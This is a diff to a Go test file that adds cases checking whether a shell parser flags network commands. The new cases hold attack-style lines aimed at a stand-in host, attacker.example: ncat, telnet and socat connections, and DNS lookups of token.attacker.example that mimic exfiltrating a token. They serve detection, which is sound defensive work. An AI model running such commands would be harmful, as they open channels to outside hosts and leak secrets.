@@ -568,6 +568,42 @@ func TestShellParser_FindNetworkCommands(t *testing.T) {
 			wantCmdNames:   []string{"curl", "wget"},
 			wantInCmdSubst: []bool{true, true},
 		},
+		{
+			name:         "ncat command",
+			script:       `ncat attacker.example 443`,
+			wantCount:    1,
+			wantCmdNames: []string{"ncat"},
+		},
+		{
+			name:         "telnet command",
+			script:       `telnet attacker.example 23`,
+			wantCount:    1,
+			wantCmdNames: []string{"telnet"},
+		},
+		{
+			name:         "socat command",
+			script:       `socat - TCP:attacker.example:443`,
+			wantCount:    1,
+			wantCmdNames: []string{"socat"},
+		},
+		{
+			name:         "dig command",
+			script:       `dig token.attacker.example`,
+			wantCount:    1,
+			wantCmdNames: []string{"dig"},
+		},
+		{
+			name:         "nslookup command",
+			script:       `nslookup token.attacker.example`,
+			wantCount:    1,
+			wantCmdNames: []string{"nslookup"},
+		},
+		{
+			name:         "host command",
+			script:       `host token.attacker.example`,
+			wantCount:    1,
+			wantCmdNames: []string{"host"},
+		},
 	}
 
 	for _, tt := range tests {
